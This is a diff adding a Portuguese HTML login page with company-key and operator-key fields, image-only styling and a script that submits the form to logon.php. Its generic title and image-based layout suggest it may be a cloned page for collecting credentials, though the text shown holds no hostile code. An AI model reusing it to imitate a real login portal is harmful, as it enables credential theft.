@@ -1,0 +1,64 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <title>
+   Untitled Document
+  </title>
+  <style>
+   *{margin:0; padding:0}
+html,body{width:100%; height:100%; background:url(image/fundoindex.png); overflow:hidden}
+#geral{width:1040px; height:100%; position:relative; background-color:#FFFFFF; margin:auto}
+#topo{width:1040px; height:115px; background:url(image/topo.png); border:0; padding:0}
+#corpo{width:1040px; height:84px; background:url(image/corpo.png);border:0; padding:0}
+#corpo2{width:1040px; height:426px; background:url(image/corpo2.png);border:0; padding:0}
+#chaveemp{position:absolute;color:#4C4C4C;font-family:Arial,Helvetica,sans-serif;border:none 0px;left:58px;top:80px;width:155px;height:25px}
+#chaveop{position:absolute;color:#4C4C4C;font-family:Arial,Helvetica,sans-serif;border:none 0px;left:363px;top:80px;width:155px;height:25px}
+#acessar{position:absolute;background:url(image/entrar.png);width:61px;height:33px;border:none 0px;left:565px;top:77px;cursor:pointer}
+#acessar:hover{background:url(image/entrarh.png);}
+#erro{background:url(image/alert.png) center no-repeat; width:1040px; height:121px; display:none}
+#erroemp{background:url(image/alertemp.png) center no-repeat; width:1040px; height:121px; display:none}
+#erroop{background:url(image/alertop.png) center no-repeat; width:1040px; height:121px; display:none}
+  </style>
+ </head>
+ <body>
+  <div align="center" id="geral">
+   <div onclick="javascript: alert('Indisponivel no momento!');" id="topo">
+   </div>
+   <div id="corpo">
+   </div>
+   <div id="erro">
+   </div>
+   <div id="erroemp">
+   </div>
+   <div id="erroop">
+   </div>
+   <div id="corpo2">
+    <div style="margin:auto; position:relative; width:960px">
+     <form autocomplete="off" name="login" action="logon.php" method="post">
+      <input type="text" maxlength="10" name="chaveemp" id="chaveemp" />
+      <input type="text" maxlength="10" name="chaveop" id="chaveop" />
+     </form>
+     <input type="button" onclick="foradilma()" value="" id="acessar" />
+    </div>
+    <script type="text/javascript">
+     function foradilma(){
+var f = document.forms[0];
+if(f.chaveemp.value.length &lt;1 &amp;&amp; f.chaveop.value.length &lt;1){
+document.getElementById('erro').style.display="block";
+}
+if(f.chaveemp.value.length &gt; 1 &amp;&amp; f.chaveop.value.length &lt;1){
+document.getElementById('erroop').style.display="block";
+}
+if(f.chaveemp.value.length &lt; 1 &amp;&amp; f.chaveop.value.length &gt; 1){
+document.getElementById('erroemp').style.display="block";
+}
+else if(f.chaveemp.value.length &gt;2 &amp;&amp; f.chaveop.value.length &gt;2){
+f.submit();
+}
+}
+    </script>
+   </div>
+  </div>
+ </body>
+</html>
